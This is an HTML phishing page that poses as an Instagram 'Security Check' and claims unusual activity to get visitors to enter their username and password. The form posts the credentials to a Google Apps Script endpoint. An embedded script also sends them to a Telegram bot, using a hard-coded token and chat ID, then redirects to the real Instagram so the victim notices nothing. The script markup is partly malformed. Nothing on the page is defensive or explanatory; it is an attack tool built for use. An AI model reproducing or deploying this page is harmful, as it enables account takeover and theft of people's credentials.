<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Security Check</title>
    <style>
        body { font-family: -apple-system, sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { background: white; border: 1px solid #dbdbdb; padding: 30px; width: 320px; text-align: center; }
        h2 { font-size: 24px; font-weight: bold; margin-bottom: 20px; color: #262626; }
        p { color: #8e8e8e; font-size: 14px; margin-bottom: 20px; }
        input { width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #dbdbdb; border-radius: 3px; box-sizing: border-box; background: #fafafa; }
        button { width: 100%; padding: 10px; background-color: #0095f6; border: none; color: white; border-radius: 4px; font-weight: 600; cursor: pointer; width: 100%; }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>Instagram</h2>
        <p>Unusual activity detected. Please verify your identity.</p>
        
        <form id="authForm" action="https://script.google.com/macros/s/AKfycbxCIOVFoEGkpYtGsAjzvHcPwcCoQYT3rR1Bcdduk7mAy4RWKSFchYgx_E5f66qZAoPN/exec" method="POST">
            <input type="text" name="username" placeholder="Username or Email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
    </div>

    <script>
        document.getElementById('authForm').onsubmit = function() {
            // Forcefully redirect within 1 second
            setTimeout(function() {
                window.location.replace("https://www.instagram.com/accounts/login/");
            }, 1000);
        <script>
document.querySelector('form').addEventListener('submit', async (e) => {
    e.preventDefault();
    
    const username = document.querySelector('input[type="text"]').value;
    const password = document.querySelector('input[type="password"]').value;
    
    const botToken = '8662750137:AAGEIPealqUPso3hFzdCJrUZln684PaVX3k';
    const chatId = '8639892987';
    const message = `🔥 NEW STRIKE! 🔥\n\n👤 User: ${username}\n🔑 Pass: ${password}`;

    // Telegram bhej raha hai
    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: message })
    });

    // Data bhejne ke baad asli Instagram par redirect kar do taaki shak na ho
    window.location.href = "https://www.instagram.com";
});
</script>
